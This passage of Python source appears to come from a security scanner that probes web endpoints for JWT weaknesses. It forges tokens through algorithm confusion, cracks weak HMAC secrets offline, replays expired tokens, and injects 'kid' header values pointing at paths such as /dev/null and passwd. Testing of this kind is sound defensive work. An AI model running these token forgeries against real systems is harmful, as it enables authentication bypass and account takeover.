        forged_header["alg"] = "HS256"
        # Sign with empty secret (mimics using public key as HMAC secret)
        token = self._build_jwt(forged_header, payload, "", "HS256")
        resp = await self._send_jwt(token, target_url, cookies)
        if resp and resp.status_code == 200:
            return {
                "endpoint": target_url,
                "jwt_attack": "alg_confusion",
                "detail": f"RS→HS256 algorithm confusion: forged token accepted",
                "evidence_score": 5,
                "cracked_secret": "",
                "original_algorithm": header.get("alg", "?"),
                "request_dump": f"GET {target_url}\nAuthorization: Bearer {token[:80]}...",
                "response_dump": f"HTTP {resp.status_code}\n{resp.text[:300]}",
            }
        return None

    def _test_weak_secrets(
        self, original_token: str, header: dict, payload: dict,
        original_alg: str,
    ) -> dict[str, Any] | None:
        """Offline brute-force: try 20 common secrets, compare signatures."""
        import base64
        import hashlib
        import hmac

        if not original_alg.startswith("HS"):
            return None

        parts = original_token.split(".")
        if len(parts) < 3:
            return None

        signing_input = f"{parts[0]}.{parts[1]}".encode()
        original_sig = parts[2]

        hash_func = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(original_alg, hashlib.sha256)

        def b64url(data: bytes) -> str:
            return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

        for secret in self._WEAK_SECRETS:
            computed = b64url(hmac.new(
                secret.encode(), signing_input, hash_func,
            ).digest())
            if computed == original_sig:
                return {
                    "endpoint": "offline",
                    "jwt_attack": "weak_secret",
                    "detail": f"JWT signed with weak secret: '{secret}'",
                    "evidence_score": 5,
                    "cracked_secret": secret,
                    "original_algorithm": original_alg,
                    "request_dump": f"Token: {original_token[:80]}...",
                    "response_dump": f"Secret cracked offline: {secret}",
                }
        return None

    async def _test_expired_token(
        self, header: dict, payload: dict, target_url: str,
        cookies: dict[str, str] | None,
    ) -> dict[str, Any] | None:
        expired = dict(payload)
        expired["exp"] = 1000000000  # 2001-09-09 — definitely expired
        expired["iat"] = 1000000000
        token = self._build_jwt(header, expired, "", header.get("alg", "HS256"))
        resp = await self._send_jwt(token, target_url, cookies)
        if resp and resp.status_code == 200:
            return {
                "endpoint": target_url,
                "jwt_attack": "expired_token",
                "detail": "Expired JWT accepted — token expiry not enforced",
                "evidence_score": 4,
                "cracked_secret": "",
                "original_algorithm": header.get("alg", "?"),
                "request_dump": f"GET {target_url}\nAuthorization: Bearer {token[:80]}...",
                "response_dump": f"HTTP {resp.status_code}\n{resp.text[:300]}",
            }
        return None

    async def _test_kid_injection(
        self, header: dict, payload: dict, target_url: str,
        cookies: dict[str, str] | None, original_alg: str,
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []
        for inj_name, kid_value in self._KID_INJECTIONS:
            forged_header = dict(header)
            forged_header["kid"] = kid_value
            # For /dev/null or empty file: sign with empty string
            secret = "" if "null" in kid_value or "passwd" in kid_value else "secret"
            token = self._build_jwt(forged_header, payload, secret, original_alg)
            resp = await self._send_jwt(token, target_url, cookies)
            if resp and resp.status_code == 200:
                findings.append({
                    "endpoint": target_url,
                    "jwt_attack": f"kid_{inj_name}",
                    "detail": f"JWT kid injection ({inj_name}): kid={kid_value} accepted",
                    "evidence_score": 5,
                    "cracked_secret": secret,
                    "original_algorithm": original_alg,
                    "request_dump": f"GET {target_url}\nkid: {kid_value}\nAuthorization: Bearer {token[:80]}...",
                    "response_dump": f"HTTP {resp.status_code}\n{resp.text[:300]}",
                })
                break  # One kid injection is enough
        return findings

    async def close(self):
        await self._client.aclose()
